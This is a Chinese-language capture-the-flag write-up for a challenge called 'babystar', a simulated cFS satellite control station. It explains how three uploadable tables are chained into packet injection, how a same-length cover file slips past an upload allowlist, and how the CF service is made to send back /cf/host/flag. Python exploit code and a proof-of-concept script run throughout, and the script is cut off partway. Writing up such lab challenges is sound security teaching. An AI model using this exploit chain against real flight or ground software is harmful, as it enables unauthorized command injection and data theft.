# babystar

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 容器题（无附件） |
| 附件 | 无 |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

题面：获得了一个有限权限的模拟卫星测控站，你能从`/cf/host/flag`中拿到重要信息吗？
题目同时给出了地面链路帧格式：
整题没有二进制附件，所有信息都来自线上协议。攻击面是cFS（core Flight System）风格的三张可上传表：`HK.CopyTable`、`HS.MsgActs_Tbl`、`HS.AppMon_Tbl`。漏洞本质是“表数据被当作可信配置直接执行”，于是可以用一张拷贝表把地面可控的包内容搬进一个遥测包模板，再用动作表把该模板当作命令发出去，最终让星上CF服务把`/cf/host/flag`回传。

## 2. 题目分析

### 链路帧

每一帧的线上格式是：

```text
kind(1字节: 'C'/'F'/'T'/'E') + length(4字节大端) + payload
```

发送时直接拼这段头：

```python
def send(self, kind, payload):
    self.sock.sendall(kind + len(payload).to_bytes(4, "big") + payload)
```

接收侧按`kind`分支：

- `E`：payload是ASCII错误文本，直接抛出；
- `T`：`payload[:2] == b"\x08\x08"`时表示事件消息，事件字符串从`payload[48:]`开始，遇到`\0`截断，用来做阶段同步；
- `F`：`payload[0] & 0x10`（文件数据PDU）且`payload[4] == 25`（目的EID是地面）时，偏移取`payload[7:11]`（4字节大端），数据取`payload[11:]`。

因为服务是流式的，`recv`必须精确读满`5 + length`字节，不能依赖一次`recv`的边界。

### CCSDS命令包

```python
def ccsds(apid, code, body=b""):
    packet = bytearray(struct.pack(">HHHBB", 0x1800 | apid, 0xC000, len(body) + 1, code, 0) + body)
    checksum = 0xFF
    for byte in packet:
        checksum ^= byte
    packet[7] = checksum
    return bytes(packet)
```

即8字节主头加body：

| 偏移 | 字段 | 取值 |
| --- | --- | --- |
| 0..1 | packet ID | `0x1800 \ | apid`（版本0、类型1表示命令、secondary header标志1） |
| 2..3 | 序列控制 | `0xC000`（standalone，无分段） |
| 4..5 | packet data length | `len(body)+1`（从功能码字节开始计数，不含主头前6字节） |
| 6 | 功能码 | `code` |
| 7 | 校验 | 全包按`0xFF`初值逐字节XOR；计算时该字节先按0参与，算完再写回 |

星上命令的APID决定功能域：

- `0x88`：普通上行命令（自己的`C`帧就走这个APID）；
- `0x04`：文件服务（cFS`CF`/`FM`风格），功能码2=加载到工作缓冲区、4=校验表、5=激活表；
- `0x9C`：消息动作服务，功能码0=发送指定MID的包。

### 表镜像格式

三张表都按同一镜像格式上传，由`table_image`封装：

```python
def table_image(name, data):
    fs_header = struct.pack(">8I32s", 0x63464531, 8, 64, 0x42, 1, 0, 0, 0, b"Table Image")
    tbl_header = struct.pack(">III40s", 0, 0, len(data), name.encode())
    return fs_header + tbl_header + data
```

- 64字节文件系统头：magic`0x63464531`（ASCII为`cFE1`）、字段`8`、头部长度`64`、`0x42`、`1`、三个0，以及32字节`Table Image`描述；
- 52字节表头：`0,0,len(data)`加40字节表名；
- 之后才是表数据。

因此三张表的镜像长度是固定的：`HK.CopyTable`数据区2048字节，镜像2164字节；`HS.MsgActs_Tbl`数据区24字节，镜像140字节；`HS.AppMon_Tbl`数据区26字节，镜像142字节。脚本里的`assert`就是校验这三个长度，长度错了说明结构体拼错。

### CFDP文件上传

`cfdp_pdu`拼出最小PDU头：

```python
def cfdp_pdu(mode, txn, data):
    return bytes([mode]) + len(data).to_bytes(2, "big") + b"\0" + bytes([23, txn, 25]) + data
```

`mode`为`0x20`表示带指令（metadata/EOF），`0x30`表示文件数据；`23`是本星EID，`25`是地面EID，`txn`是事务号。上传分三步：

1. metadata（`0x20`）：`b"\x07\0"` + 4字节文件长度+两遍“长度+文件名”（源名与目的名相同）；
2. 文件数据（`0x30`）：每片`offset`（4字节大端）+最多480字节；
3. EOF（`0x20`）：`b"\x04\0"` + 4字节CFDP校验和+ 4字节文件长度。

校验和是把内容补齐到4字节后，按4字节大端整数求和并取低32位：

```python
def cfdp_checksum(content):
    padded = content + b"\0" * (-len(content) % 4)
    return sum(int.from_bytes(padded[i:i + 4], "big") for i in range(0, len(padded), 4)) & 0xFFFFFFFF
```

### 链路帧到总线消息的映射

链路帧只是传输层。服务端把`C`帧payload解成CCSDS命令包后，按APID投递到cFS风格的软件总线，总线上的每条消息有一个Message ID（MID），其高字节就是APID：地面命令`0x88`对应MID`0x1888`，遥测包模板`0xB3`对应MID`0x18B3`，而`0x9C`是“消息动作服务”的命令入口。

星上各任务（HK、HS、CF、MM等）都是按MID订阅的，因此谁往总线上写一条`0x18B3`，谁就等于替遥测任务伪造了一个遥测包。这决定了整道题不需要任何内存破坏：只要让总线收到一条内容可控、MID正确的包，就能借星上逻辑走完全部流程。CopyTable的`output_mid`与动作表参数都写`0x18B3`，原因就在这里。

### 表服务与信任边界

三张表都由表服务管理，镜像格式是“文件系统头+表头+数据区”：64字节文件系统头用magic`cFE1`声明这是表镜像；52字节表头给出数据区长度与表名，服务端据此找到同名注册表并核对长度是否与编译期定义一致；数据区再按该表的C结构体逐字段解释。

三个阶段语义不同：加载只把镜像拷进工作缓冲区，校验确认尺寸与内容合法，激活才把工作缓冲区替换为活动表并让使用者立即读新值。漏洞正是出在这里——表数据本是“配置”，却包含`input_mid`/`output_mid`/动作命令这类会被运行时直接当作指令执行的内容，而校验只问“表名与长度对不对”，不问“这条搬运目标是否该被允许、这条动作是否是合法业务命令”。于是三张表可以串成一条任意包注入链：HK把地面数据搬进遥测包，HS把“发送该遥测包”登记成自动动作，AMT让这个动作在“监控到应用缺失”时被触发。

## 3. 解题过程

### 用`HK.CopyTable`做搬运工

`hk_entry`的条目是16字节：

```python
def hk_entry(input_mid, input_offset, output_mid, output_offset, count):
    return struct.pack("<I H 2x I H H", input_mid, input_offset, output_mid, output_offset, count)
```

语义是按条目把`input_mid`包中`input_offset`处的`count`字节复制到`output_mid`包的`output_offset`。脚本构造了7条：

```python
defaults = [0x0801, 0x0805, 0x0803, 0x0800, 0x0804]
entries = [hk_entry(mid, 12, 0x089C, 12 + 4 * i, 4) for i, mid in enumerate(defaults)]
entries += [hk_entry(0x1888, 8, 0x18B3, 8, 136), hk_entry(0x1888, 144, 0x18B3, 6, 1)]
hk = table_image("HK.CopyTable", b"".join(entries).ljust(2048, b"\0"))
```

前5条是正常的HK参数搬运（把各HK包的13字节参数搬到`0x089C`的载荷区，保持表“看起来正常”）；关键是后两条：

- 把`0x1888`包偏移8开始的136字节整体复制到`0x18B3`偏移8；
- 再把`0x1888`包偏移144的**1字节**复制到`0x18B3`偏移6。

`0x1888`就是地面发上去的`C`帧（APID`0x88`，即`0x1800|0x88`），其载荷由完全控制；`0x18B3`是遥测包模板（APID`0xB3`）。偏移8正好是CCSDS主头之后、即CCSDS包体起点（`0x18B3`包的第2字节起），所以整个CF请求体会落在遥测包的载荷区。最后那1字节落在`0x18B3`的功能码字节（主头偏移6）上，用来把这个包改成“长度非法”的MM NOOP——它不需要真的按遥测格式合法，只要能被消息动作服务原样发出去即可。

几点实现细节：

- HK服务按固定周期（约1秒）遍历拷贝表，每个条目独立做一次搬运。因此`carrier`只要在AMT激活前发上去、并留出至少一个HK周期，`0x18B3`的载荷区就一定是新内容；脚本在发完`carrier`后`receive(2)`，就是在等这个周期。
- 前5条把正常HK参数搬到`0x089C`，偏移`12 + 4*i`按4字节参数顺序排布，作用是让这张表在结构自检下像一张普通表；它们不影响利用，但能降低“异常配置”的观感。
- 第6条的136字节恰好等于CF class 1请求体长度，`input_offset=8`跳过命令包主头、`output_offset=8`跳过遥测包主头，首尾对齐后搬运结果逐字节相同。
- 第7条的源字节是`carrier`末尾补的那个`0x20`（偏移`8+136=144`）。它被写到功能码位后，包内声明的长度与真实长度不匹配，MM会拒绝对其执行；但只需要“被发送”，不需要“被执行”，这也是把它做成NOOP而不是合法命令的原因。

### 用`HS.MsgActs_Tbl`注册动作

```python
trigger = ccsds(0x9C, 0, struct.pack("<I", 0x18B3))
mat = table_image("HS.MsgActs_Tbl", struct.pack("<HH4x16s", 1, 0, trigger))
```

表的每条记录是`uint16 count=1`、`uint16 0`、4字节填充、16字节动作；动作本身是一条完整的CCSDS命令包——APID`0x9C`、功能码0、4字节小端`0x18B3`，含义是“把MID为`0x18B3`的包发出来”。`trigger`长度正好12字节，`mat`镜像140字节。

这里的设计要点是：动作不是“抽象描述”，而是一条可以直接投递的完整命令包，服务触发时把这16字节原样送上总线，等于把“发包”这个行为数据化了。`count`表示该应用名对应多少条动作，4字节填充只是为了让16字节动作落在记录边界上；镜像总长`64+52+24=140`。

### 用`HS.AppMon_Tbl`触发

```python
amt = table_image("HS.AppMon_Tbl", struct.pack("<20sHHH", b"NO_SUCH_APP", 0, 1, 4))
```

应用监控表登记了一个不存在的应用`NO_SUCH_APP`，其余字段为`0,1,4`（起始索引0、动作条数1、动作偏移4）。激活这张表后，监控逻辑遍历时发现该应用不存在，就按索引4去`HS.MsgActs_Tbl`里取第0条动作并执行，于是`0x18B3`被发送。

这就是整条链的“执行”环节：表被当作配置加载，却能被配置成“发任意包”。

理解这张表的语义就能明白为什么顺序敏感：每条记录是“应用名+起始索引+动作条数+动作表偏移”，监控服务周期性核对列表中的应用是否还在运行，一旦发现缺失，就按记录里的索引去动作表取动作并执行。故意写一个不存在的名字，把“应用异常”这个本应告警的事件改造成触发开关。而AMT一旦激活，首个监控周期就会命中缺失应用并立即执行动作，所以它必须排在动作表激活之后、`carrier`发出并且被HK搬运之后——这两点任意一条不成立，取到的就是空包或过期包。

### 用CF class 1读flag

```python
# CF class 1, keep source, channel 1, priority 0, destination EID 23.
cf_body = struct.pack("<BBBBI64s64s", 0, 1, 1, 0, 23, b"/cf/host/flag", b"flag")
carrier = ccsds(0x88, 0, cf_body + b"\x20")
```

这136字节是CF class 1请求体：

| 偏移 | 字段 | 取值 |
| --- | --- | --- |
| +0 | 服务类型/保留 | `0` |
| +1 | class | `1`（class 1，单向、无ACK） |
| +2 | 通道 | `1` |
| +3 | 优先级 | `0` |
| +4..7 | 目的EID | `23`（本星） |
| +8..71 | 源路径 | `/cf/host/flag` |
| +72..135 | 目的名 | `flag` |

末尾再补一个`0x20`，共137字节。它作为`C`帧（APID`0x88`）发上去后，被`HK.CopyTable`搬进`0x18B3`的载荷区；随后AMT触发`0x18B3`发送，星上的CF服务就把这条命令当作本星下发的请求处理，按源路径读取`/cf/host/flag`，再以CFDP文件数据PDU（`F`帧、目的EID 25）回传给地面。

几个字段为什么这样选：

- class 1是单向、无确认的传输模式，没有ACK/FIN往返，星上收下即处理，正好适合“读一次就走”；
- 服务类型`0`表示put/读请求，目的EID填`23`（本星）意味着请求由本星自己充当接收端，即自收自发，不需要地面参与握手；
- 目的名`flag`只是回传文件的元数据，与源路径`/cf/host/flag`解耦，因此不必猜星上的落地路径；
- CF回传PDU的目的EID固定是地面`25`，接收端用`payload[4] == 25`即可把flag数据从其它`F`帧中筛出来；
- class 1不保证分片顺序，所以接收端按`payload[7:11]`记录offset再排序拼接，避免TCP流中PDU乱序导致内容错位、正则匹配失败。

接收侧只要把`F`帧按偏移拼起来，正则匹配即可：

```python
if kind == b"F" and len(payload) >= 11 and payload[0] & 0x10 and payload[4] == 25:
    offset = int.from_bytes(payload[7:11], "big")
    self.parts[offset] = payload[11:]
    content = b"".join(self.parts[pos] for pos in sorted(self.parts))
    found = re.search(rb"flag\{[^}]+\}", content)
    if found:
        self.flag = found.group().decode()
```

### 绕过上传白名单

`HS.MsgActs_Tbl`与`HS.AppMon_Tbl`在上传时要先过HK表的允许列表检查：服务只看“首个整文件PDU”里的文件系统头，若表名是`HK.CopyTable`就放行。脚本用`overlap=True`处理：

```python
if overlap:
    # The first full file-data PDU passes the HK table allowlist check.
    cover = table_image("HK.CopyTable", bytes(len(content) - 116))
    assert len(cover) == len(content)
    versions = (cover, content)
```

先发一份“看起来是`HK.CopyTable`”的同长度封面文件（数据区用0填充），让首个整文件PDU通过检查；随后再发真正内容，覆盖同一文件路径。由于两次发送使用同一个事务号与同一文件名，星上文件被后者覆盖，校验和也按真正内容计算，因此校验能通过。

封面长度必须与真实内容完全等长（脚本用`len(content) - 116`反推数据区长度，`116 = 64 + 52`），否则三处会不一致：metadata里声明的文件长度、EOF里声明的长度、校验和的覆盖范围。白名单只看首个整文件PDU里文件系统头之后的表名，对后续PDU和最终内容不做二次核对，这个“检查在前、写入在后”的时间差就是绕过点。表名与文件名解耦同样关键：`hs_mat_x.tbl`/`hs_amt_x.tbl`这类名字不含`HK`，但白名单判定的是镜像内的表名，而不是上传文件名。

上传完成后统一走三步：

1. 加载到工作缓冲区：APID`0x04`、功能码2、body为`/cf/uplink/<name>`左补齐到64字节；
2. 校验：功能码4、body为`\0\0` +表名左补齐到40字节；
3. 激活：功能码5、body为表名左补齐到40字节。

### 完整时序

```text
upload hk_cf.tbl        -> load/validate/activate HK.CopyTable
upload hs_mat_x.tbl     -> load/validate/activate HS.MsgActs_Tbl（封面绕过）
upload hs_amt_x.tbl     -> load/validate（封面绕过）
send C(carrier, APID 0x88)   # 先让HK把CF请求搬进0x18B3
activate HS.AppMon_Tbl       # 再触发动作发送0x18B3
receive F frames             # 按offset重组，正则取flag
```

脚本用`link.receive(2)`与`link.receive(30)`做等待，并以`successfully retained file as /cf/uplink/{name}`、`Successful load into working buffer`、`validation successful`、`Successfully Updated '{table_name}'`这些事件字符串作为阶段同步点：每个阶段都等到对应事件再走下一步，避免表还没激活就开始发命令。

时序上有三个必须成立的不变量：

1. `HK.CopyTable`要先激活，且`carrier`发出后要留够一个HK周期，否则`0x18B3`里仍是旧内容——这正是`activate HS.AppMon_Tbl`之前那次`receive(2)`的意义；
2. `HS.MsgActs_Tbl`必须先于`HS.AppMon_Tbl`激活，因为AMT的触发是“立即执行”，动作表未生效时取索引只会拿到空记录；
3. AMT的加载与校验可以提前做完，但“激活”必须放在`carrier`之后：激活即触发，顺序颠倒只能发出空包，且不会重试。

把三张表看作“数据驱动的命令注入”就能串起来：HK提供**写**（把地面字节写进星上包缓冲区），HS提供**发**（把发送任意MID变成一个可自动执行的动作），AMT提供**触发**（把异常条件变成定时开关）。CF只是最终被调用的“读文件”功能，本身没有任何漏洞。

## 4. PoC

```python
"""Solve the satellite ground-station challenge on a fresh instance.

Usage: 运行上文PoC代码 HOST PORT
       运行上文PoC代码 --dry-run
"""
import argparse
import re
import socket
import struct
import time

def ccsds(apid, code, body=b""):
    packet = bytearray(struct.pack(">HHHBB", 0x1800 | apid, 0xC000, len(body) + 1, code, 0) + body)
    checksum = 0xFF
    for byte in packet:
        checksum ^= byte
    packet[7] = checksum
    return bytes(packet)

def table_image(name, data):
    fs_header = struct.pack(">8I32s", 0x63464531, 8, 64, 0x42, 1, 0, 0, 0, b"Table Image")
    tbl_header = struct.pack(">III40s", 0, 0, len(data), name.encode())
    return fs_header + tbl_header + data

def hk_entry(input_mid, input_offset, output_mid, output_offset, count):

# ...
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="<TARGET_IP>")
    parser.add_argument("port", nargs="?", type=int, default=0)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    hk, mat, amt, carrier = build_payloads()
    if args.dry_run:
        print("payload sizes:", len(hk), len(mat), len(amt), len(carrier))
        return
    link = Link(args.host, args.port)
    try:
        link.upload("hk_cf.tbl", hk, 200)
        link.load_and_validate("hk_cf.tbl", "HK.CopyTable")
        link.activate("HK.CopyTable")

        link.upload("hs_mat_x.tbl", mat, 201, overlap=True)
        link.load_and_validate("hs_mat_x.tbl", "HS.MsgActs_Tbl")
```
